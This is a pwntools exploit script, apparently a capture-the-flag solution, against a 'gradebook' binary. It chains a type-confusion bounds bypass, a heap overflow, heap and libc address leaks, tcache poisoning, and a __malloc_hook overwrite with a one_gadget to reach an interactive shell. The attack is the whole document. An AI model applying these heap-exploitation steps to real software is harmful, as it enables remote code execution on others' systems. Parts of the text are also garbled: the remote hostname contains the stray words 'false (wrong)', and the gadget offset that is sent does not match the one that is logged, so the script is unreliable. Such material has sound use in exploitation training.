#!/usr/bin/env python3



from pwn import *

e = ELF("./gradebook_patched")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")
#r = remote("ctf.k3rn3l4r false (wrong) my.com",2250)
r = process("./gradebook_patched")


def create(ids,length,value):
    r.sendafter(b">",b"1\n")
    r.sendafter(b"id:",ids + b"\n")
    r.sendafter(b"length:",f"{length}\n")
    r.sendafter(b"name:",value)

def delete():
    r.sendafter(b">",b"5\n")

def update_grade(ids,grade):
    r.sendafter(b">",b"3\n")
    r.sendafter(b"id:",ids + b"\n")
    r.sendafter(b"grade:",f"{grade}\n")


def update_name(ids,name):
    r.sendafter(b">",b"4\n")
    r.sendafter(b"id:",ids + b"\n")
    r.sendafter(b"name:",name)

def leak_heap():
    r.sendafter(b">",b"2\n")
    r.recvuntil(b"NAME:")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    heap_base = leak - 0x740
    return heap_base

def leak_libc():
    r.sendafter(b">",b"2\n")
    r.recvuntil(b"NAME:")
    leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
    leak = leak - 0x1ebbe0
    return leak
ids1 = b"A" * 8 
ids2 = b"B" * 8 
ids3 = b"C" * 8
p1 = b"A" * 20 
p2 = b"B" * 20
p3 = b"C" * 20
create(ids1,0x418,p1)
create(ids2,0x28,p2)
create(ids3,0x28,p1)
delete()
log.info("Two chunks with size 40 and a single chunk with size 1048 created and deleted")
log.info("Two small chunks goes into tcache and the other one goes into unsortedbin")
create(ids1,0x28,p1)
create(ids2,0x28,p2)
update_grade(ids2,0x5000000000)
log.info("Using the wrong type caste bug to bypass bound check to tamper size field to create a overflow primitive")
overlap1 = b"B" * 48 + p64(0x21) + b"A" * 8 + p64(0x5000000000) + p8(0x40)  
log.info("Now overflow the chunk to tamper another chunk pointer in order to create arbitary address write and read after free")
update_name(ids2,overlap1)
log.info("Partial overwrite to get tcache metadata to leak heap address")
heap = leak_heap()
log.info("The heap base of the process is " + hex(heap))
libc_leaker = heap + 0x2c0
tcache_tamper = heap + 0x90
overlap2 = b"B" * 48 + p64(0x21) + b"A" * 8 + p64(0x5000000000) + p64(libc_leaker) 
update_name(ids2,overlap2)
log.info("After leaking heap address,Now let's tamper the same pointer again to get unsortedbin metadata to leak libc address")
libc_base = leak_libc()
log.info("The libc base of the process is  "+  hex(libc_base))
overlap3 = b"B" * 48 + p64(0x21) + b"A" * 8 + p64(0x5000000000) + p64(tcache_tamper)
update_name(ids2,overlap3)
log.info("Its time to use Arbitary Address write primitive to tamper tcache structure itself to link a fake chunk")
update_name(ids1,b"A" * 8 + p64(libc_base + libc.sym["__malloc_hook"]))
log.info("Tcache structure tampered with the address of fake chunk which is the address of malloc hook")
r.sendafter(b">",b"1\n")
r.sendafter(b"id:",p64(libc_base + 0xe6c81))
log.info("Malloc hook is tampered with the address of one_gadget(" + hex(libc_base + 0xecc81) +")")
r.sendafter(b"length:",b"10\n")
log.info("Remote Code Execution triggered!!")
r.interactive()
